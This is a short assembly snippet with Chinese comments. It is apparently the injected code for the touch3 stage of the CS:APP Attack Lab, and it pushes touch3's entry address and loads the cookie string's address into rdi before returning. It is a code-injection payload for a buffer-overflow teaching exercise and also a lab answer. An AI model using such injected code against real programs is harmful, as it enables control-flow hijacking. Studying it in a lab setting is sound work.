push $0x004018fa # 把touch3的入口地址放入栈
movq $0x5561dca8,%rdi # 把cookie首地址放到rdi中 
retq
